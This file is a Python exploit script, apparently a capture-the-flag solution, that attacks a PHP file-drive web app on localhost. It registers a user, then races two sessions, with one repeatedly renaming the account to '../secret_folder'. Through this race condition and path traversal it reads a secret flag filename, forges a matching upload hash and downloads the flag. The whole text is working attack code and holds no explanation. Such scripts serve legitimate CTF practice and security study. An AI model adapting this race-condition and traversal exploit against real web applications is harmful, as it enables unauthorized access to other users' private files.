import requests
import multiprocessing
import re

URL = "http://localhost:1337"
s1 = requests.Session()
data = {
	"username":"test",
	"password":"test"
}
s1.post(URL+"/register.php",data=data)
s1.post(URL+"/login.php",data=data)

s2 = requests.Session()
r = s2.post(URL+"/login.php",data=data)

def changeUsername():
	d = {
		"username":"test",
		"current_password":"test",
		"new_password":"test"
	}
	while True:
		d["username"] = "test"
		s1.post(URL+"/settings.php",data=d)
		d["username"] = "../secret_folder"
		s1.post(URL+"/settings.php",data=d)

t1 = multiprocessing.Process(target=changeUsername, args=())
t1.start()
# print("Started")
while True:
	r = s2.get(URL+"/drive.php")
	if "flag" in r.text:
		result = re.findall("(flag-[a-f0-9]+\.txt)", r.text)
		file_name = result[0]
		break
print("File name:"+file_name)
t1.terminate()
# print("end")
d = {
	"username":"test",
	"current_password":"test",
	"new_password":"test"
}
s1.post(URL+"/settings.php",data=d)
open(file_name,'wb').write(b"test")
r = s1.post(URL+"/drive.php",files={'fileToUpload': open(file_name,'rb')},data={"submit":""})
result = re.findall("hash\=([a-f0-9]+)", r.text)
h = result[0]
print("hash: "+h)
t1 = multiprocessing.Process(target=changeUsername, args=())
t1.start()
while True:
	r = s2.get(URL+"/download.php?file="+file_name+"&hash="+h)
	if "flag{" in r.text:
		result = re.findall("(flag{.*})", r.text)
		print("Flag: "+result[0])
		break
t1.terminate()